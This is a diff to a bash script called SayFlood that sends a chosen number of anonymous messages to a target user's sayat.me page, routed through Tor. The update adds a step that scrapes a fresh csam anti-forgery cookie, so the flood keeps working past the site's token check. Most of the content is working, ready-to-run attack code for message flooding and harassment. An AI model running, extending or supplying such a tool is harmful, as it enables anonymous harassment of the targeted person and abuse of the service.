@@ -1,5 +1,5 @@
 #!/bin/bash
-# SayFlood v1.0
+# SayFlood v1.1
 # Author: https://github.com/thelinuxchoice/sayflood
 
 banner() {
@@ -9,7 +9,7 @@ printf "\e[1;77m  ____              _____ _                 _  \n"
 printf " / ___|  __ _ _   _|  ___| | ___   ___   __| | \n"
 printf " \___ \ / _\` | | | | |_  | |/ _ \ / _ \ / _\` | \n"
 printf "  ___) | (_| | |_| |  _| | | (_) | (_) | (_| | \n"
-printf " |____/ \__,_|\__, |_|   |_|\___/ \___/ \__,_| \n"
+printf " |____/ \__,_|\__, |_|   |_|\___/ \___/ \__,_|v1.1 \n"
 printf "              |___/\e[0m                            \n"
 printf "\e[1;92m  Author: github.com/thelinuxchoice/sayflood\e[0m\n"
 printf "\e[1;77m  @linux_choice\n\e[0m"
@@ -47,12 +47,13 @@ message="${message:-${default_message}}"
 read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Amount message (Default: 100): ' amount
 amount="${amount:-${default_amount}}"
 
-
+curl -i -L -s -c cookies.txt $'https://sayat.me/'$username'' > /dev/null 2>&1
+csam=$(grep  -o 'csam.*' cookies.txt | awk {'print $2'})
 for i in $(seq 1 $amount); do
-
+ 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sending message:\e[0m\e[1;93m %s\e[0m\e[1;77m/\e[0m\e[1;93m%s ...\e[0m" $i $amount
 IFS=$'\n'
-send=$(curl --socks5 localhost:9050 -i -s -k  -X $'POST'     -H $'Host: sayat.me' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://sayat.me/'$username'' -H $'Cookie: __cfduid=dad12d6fa33da4469e4b16501ec0f535c1536089141; csam=5c2b178255; language=en; guid=%7BE5703EDD-EC59-78BC-4DBB-5C570E58E6DC%7D; last_activity=1536091759; _ga=GA1.2.1723360848.1536089156; _gid=GA1.2.811908030.1536089156; trc_cookie_storage=taboola%2520global%253Auser-id%3D67168056-f87a-40d5-846f-b0f0a546bd22-tuct2886117; PHPSESSID=rs933ps8nirenskvr9va6lb232' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded'  -b $'__cfduid=dad12d6fa33da4469e4b16501ec0f535c1536089141; csam=5c2b178255; language=en; guid=%7BE5703EDD-EC59-78BC-4DBB-5C570E58E6DC%7D; last_activity=1536091759; _ga=GA1.2.1723360848.1536089156; _gid=GA1.2.811908030.1536089156; trc_cookie_storage=taboola%2520global%253Auser-id%3D67168056-f87a-40d5-846f-b0f0a546bd22-tuct2886117; PHPSESSID=rs933ps8nirenskvr9va6lb232'     --data-binary $'write='$message'&gif=&giphy=&more_feedback_input=&foo=C8MQzISSm05kdk8&bar=OXoBdGhDcGpqVAkMUl1SAQ%3D%3D&url=&password=&password_confirm=&signup=0&url_login=&password_login=&login=0&csam=5c2b178255'     $'https://sayat.me/'$username'' | grep 'HTTP/2 200'; echo $?)
+send=$(curl --socks5-hostname localhost:9050 -b cookies.txt -i -s -k  -X $'POST'     -H $'Host: sayat.me' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://sayat.me/'$username''  -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded'        --data-binary $'write=message&gif=&giphy=&more_feedback_input=&foo=C8MQzISSm05kdk8&bar=IGMYbXFaaXNzTRAVS0RLGA%3D%3D&url=&password=&password_confirm=&signup=0&url_login=&password_login=&login=0&csam='$csam''     $'https://sayat.me/'$username''  | grep 'HTTP/2 200'; echo $?)
 
 if [[ $send == "1" ]]; then
 printf "\e[1;93m Fail\n\e[0m"
